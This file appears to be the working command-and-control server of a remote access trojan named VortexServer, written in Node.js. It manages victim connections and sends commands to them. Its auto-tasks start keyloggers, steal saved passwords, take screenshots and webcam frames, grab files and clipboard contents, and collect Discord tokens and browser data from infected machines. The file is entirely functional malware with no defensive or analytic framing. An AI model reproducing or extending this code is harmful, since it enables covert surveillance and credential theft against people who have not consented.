const net = require('net');
const crypto = require('crypto');
const EventEmitter = require('events');
const os = require('os');

class VortexServer extends EventEmitter {
  constructor() {
    super();
    this.servers = new Map();
    this.clients = new Map();
    this.totalConnections = 0;
    this.uploadBytes = 0;
    this.downloadBytes = 0;
    this.autoTasks = {
      keylogger: false,
      screenshot: false,
      passwords: false,
      clipboard: false,
      webcam: false,
      filegrab: false
    };
  }

  startListener(port) {
    if (this.servers.has(port)) {
      this.emit('log', 'WARN', `Port ${port} is already listening`);
      return false;
    }

    const server = net.createServer((socket) => {
      this._handleConnection(socket, port);
    });

    server.on('error', (err) => {
      this.emit('log', 'ERROR', `Port ${port}: ${err.message}`);
      this.servers.delete(port);
    });

    server.listen(port, '0.0.0.0', () => {
      this.emit('log', 'SERVER', `Listening on port ${port}`);
      this.emit('server-status', { port, status: 'listening' });
    });

    this.servers.set(port, server);
    return true;
  }

  stopListener(port) {
    const server = this.servers.get(port);
    if (server) {
      server.close();
      this.servers.delete(port);
      this.emit('log', 'SERVER', `Stopped listener on port ${port}`);
      return true;
    }
    return false;
  }

  stopAll() {
    for (const [port, server] of this.servers) {
      server.close();
      this.emit('log', 'SERVER', `Stopped listener on port ${port}`);
    }
    this.servers.clear();

    for (const [id, client] of this.clients) {
      client.socket.destroy();
    }
    this.clients.clear();
  }

  _handleConnection(socket, port) {
    const clientId = crypto.randomBytes(8).toString('hex');
    const clientInfo = {
      id: clientId,
      socket: socket,
      ip: socket.remoteAddress?.replace('::ffff:', '') || 'Unknown',
      port: port,
      connectedAt: new Date(),
      info: {},
      buffer: Buffer.alloc(0),
      ping: 0,
      lastPing: Date.now(),
      group: 'Default',
      selected: false
    };

    this.clients.set(clientId, clientInfo);
    this.totalConnections++;

    this.emit('log', 'CONNECT', `New connection from ${clientInfo.ip} on port ${port}`);
    this.emit('client-connected', clientId, clientInfo);

    socket.on('data', (data) => {
      this.downloadBytes += data.length;
      this._processData(clientId, data);
    });

    socket.on('close', () => {
      this.clients.delete(clientId);
      this.emit('log', 'DISCONNECT', `Client ${clientInfo.ip} disconnected`);
      this.emit('client-disconnected', clientId);
    });

    socket.on('error', (err) => {
      this.emit('log', 'ERROR', `Client ${clientInfo.ip}: ${err.message}`);
      this.clients.delete(clientId);
      this.emit('client-disconnected', clientId);
    });

    this.sendCommand(clientId, { type: 'get-info' });

    if (this.autoTasks.keylogger) {
      setTimeout(() => this.sendCommand(clientId, { type: 'keylogger-start' }), 2000);
    }
    if (this.autoTasks.passwords) {
      setTimeout(() => this.sendCommand(clientId, { type: 'get-passwords' }), 3000);
    }
    if (this.autoTasks.screenshot) {
      setTimeout(() => this.sendCommand(clientId, { type: 'screenshot' }), 4000);
    }
  }

  _processData(clientId, data) {
    const client = this.clients.get(clientId);
    if (!client) return;

    client.buffer = Buffer.concat([client.buffer, data]);

    while (client.buffer.length >= 4) {
      const msgLen = client.buffer.readUInt32LE(0);
      if (client.buffer.length < 4 + msgLen) break;

      const msgData = client.buffer.slice(4, 4 + msgLen);
      client.buffer = client.buffer.slice(4 + msgLen);

      try {
        const message = JSON.parse(msgData.toString('utf8'));
        this._handleMessage(clientId, message);
      } catch (err) {
        this.emit('log', 'ERROR', `Invalid message from ${client.ip}: ${err.message}`);
      }
    }
  }

  _handleMessage(clientId, message) {
    const client = this.clients.get(clientId);
    if (!client) return;

    client.ping = Date.now() - client.lastPing;
    client.lastPing = Date.now();

    switch (message.type) {
      case 'info':
        client.info = message.data || {};
        client.group = client.info.group || 'Default';
        this.emit('log', 'INFO', `Client info received: ${client.info.username}@${client.info.hostname}`);
        this.emit('client-info', clientId, client);
        break;

      case 'shell-output':
        this.emit('shell-output', clientId, message.data);
        break;

      case 'screenshot':
        this.emit('screenshot', clientId, message.data);
        break;

      case 'file-list':
        this.emit('file-list', clientId, message.data);
        break;

      case 'file-data':
        this.emit('file-download', clientId, message.data);
        break;

      case 'file-upload-result':
        this.emit('file-upload-result', clientId, message.data);
        break;

      case 'process-list':
        this.emit('process-list', clientId, message.data);
        break;

      case 'process-kill-result':
        this.emit('process-kill-result', clientId, message.data);
        break;

      case 'keylogger-data':
        this.emit('keylogger-data', clientId, message.data);
        break;

      case 'passwords':
        this.emit('passwords', clientId, message.data);
        break;

      case 'clipboard':
        this.emit('clipboard-data', clientId, message.data);
        break;

      case 'msgbox-result':
        this.emit('log', 'INFO', `MessageBox result from ${client.ip}: ${message.data}`);
        break;

      case 'pong':
        client.ping = Date.now() - (message.timestamp || Date.now());
        this.emit('client-info', clientId, client);
        break;

      case 'grabbed-files':
        this.emit('grabbed-files', clientId, message.data);
        break;

      case 'webcam-frame':
        this.emit('webcam-frame', clientId, message.data);
        break;

      case 'system-info-detail':
        this.emit('system-info-detail', clientId, message.data);
        break;

      case 'discord-tokens':
        this.emit('discord-tokens', clientId, message.data);
        break;

      case 'browser-data':
        this.emit('browser-data', clientId, message.data);
        break;

      default:
        this.emit('log', 'WARN', `Unknown message type: ${message.type}`);
    }
  }

  sendCommand(clientId, command) {
    const client = this.clients.get(clientId);
    if (!client || client.socket.destroyed) return false;

    try {
      const json = JSON.stringify(command);
      const msgBuf = Buffer.from(json, 'utf8');
      const lenBuf = Buffer.alloc(4);
      lenBuf.writeUInt32LE(msgBuf.length);

      client.socket.write(Buffer.concat([lenBuf, msgBuf]));
      this.uploadBytes += lenBuf.length + msgBuf.length;
      return true;
    } catch (err) {
      this.emit('log', 'ERROR', `Failed to send command to ${client.ip}: ${err.message}`);
      return false;
    }
  }

  sendToAll(command) {
    let count = 0;
    for (const [id] of this.clients) {
      if (this.sendCommand(id, command)) count++;
    }
    return count;
  }

  sendToSelected(command) {
    let count = 0;
    for (const [id, client] of this.clients) {
      if (client.selected && this.sendCommand(id, command)) count++;
    }
    return count;
  }

  selectClient(clientId, selected) {
    const client = this.clients.get(clientId);
    if (client) {
      client.selected = selected;
    }
  }

  getClientList() {
    const list = [];
    for (const [id, client] of this.clients) {
      list.push({
        id,
        ip: client.ip,
        port: client.port,
        username: client.info.username || 'N/A',
        hostname: client.info.hostname || 'N/A',
        os: client.info.os || 'N/A',
        country: client.info.country || 'N/A',
        group: client.group,
        ping: client.ping,
        selected: client.selected,
        connectedAt: client.connectedAt
      });
    }
    return list;
  }

  getOnlineCount() {
    return this.clients.size;
  }

  getSelectedCount() {
    let count = 0;
    for (const [, client] of this.clients) {
      if (client.selected) count++;
    }
    return count;
  }

  getStats() {
    const cpuUsage = os.loadavg()[0] || 0;
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const memUsage = Math.round(((totalMem - freeMem) / totalMem) * 100);

    return {
      online: this.clients.size,
      total: this.totalConnections,
      selected: this.getSelectedCount(),
      upload: this.uploadBytes,
      download: this.downloadBytes,
      cpu: Math.round(cpuUsage * 100) / 100,
      memory: memUsage,
      listeners: this.servers.size
    };
  }

  pingAll() {
    const timestamp = Date.now();
    this.sendToAll({ type: 'ping', timestamp });
  }
}

module.exports = VortexServer;
